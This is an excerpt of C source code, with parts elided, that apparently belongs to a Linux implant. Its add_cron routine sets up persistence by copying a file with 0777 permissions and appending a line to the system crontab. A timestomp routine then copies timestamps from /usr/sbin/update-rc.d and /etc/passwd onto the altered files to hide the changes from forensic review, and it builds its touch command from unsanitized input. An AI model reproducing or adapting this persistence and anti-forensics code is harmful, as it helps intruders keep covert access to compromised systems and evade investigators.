...
unsigned char hostname[] = "archive.ubuntu.com";
...
void timestomp(char*, char*);
void setperms(char*, char*);
...
int add_cron(char *filename)
{
    ...
    if( access( new_name, F_OK ) == -1 ) {
        ...
        char mode[] = "0777";
        setperms(new_name, mode);

        timestomp("/usr/sbin/update-rc.d", new_name);
    }
    ...
    if( str_check(crontab, cronline) == -1) {
        ...
        fp = fopen(crontab, "a");
        fprintf(fp, "%s", cronline);
        fclose(fp);

        timestomp("/etc/passwd", crontab);
    }

    return 0;
}

int str_check(char *fname, char *str) 
{
    FILE *fp;
    int line_num = 1;
    int ret = -1;
...
void timestomp(char *sfile, char *dfile)
{
    char cmd[100];

    // /usr/sbin/update-rc.d
    // /usr/bin/touch dfile -r sfile

    snprintf(cmd, 100, "/usr/bin/touch %s -r %s", dfile, sfile);
    
    char *output = malloc(1024);
    execute(cmd, output);
}

void setperms(char *fname, char *mode)
{
    int i;
